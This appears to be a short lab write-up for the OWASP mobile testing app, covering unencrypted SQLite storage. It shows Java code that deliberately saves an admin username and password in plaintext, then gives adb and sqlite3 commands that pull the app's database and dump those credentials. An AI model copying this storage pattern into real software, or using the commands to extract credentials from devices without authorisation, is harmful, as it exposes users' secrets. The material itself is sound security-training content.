## OMTG-DATAST-001-SQLITE

> app/src/main/java/sg/vp/owasp_mobile/OMTG_Android/OMTG_DATAST_001_SQLite_Not_Encrypted.java

```java
SQLiteDatabase openOrCreateDatabase = openOrCreateDatabase("privateNotSoSecure", 0, null);

openOrCreateDatabase.execSQL("CREATE TABLE IF NOT EXISTS Accounts(Username VARCHAR,Password VARCHAR);");
openOrCreateDatabase.execSQL("INSERT INTO Accounts VALUES('admin','AdminPass');");

openOrCreateDatabase.close();
```

Exploit:

- `adb pull /data/data/sg.vp.owasp_mobile.omtg_android/databases/`

- `$ sqlite3 privateNotSoSecure`

- `sqlite> select * from sqlite_master;`

```
table|android_metadata|android_metadata|3|CREATE TABLE android_metadata (locale TEXT)
table|Accounts|Accounts|4|CREATE TABLE Accounts(Username VARCHAR,Password VARCHAR)
```

- `sqlite> select * from Accounts;`

```
admin|AdminPass
```

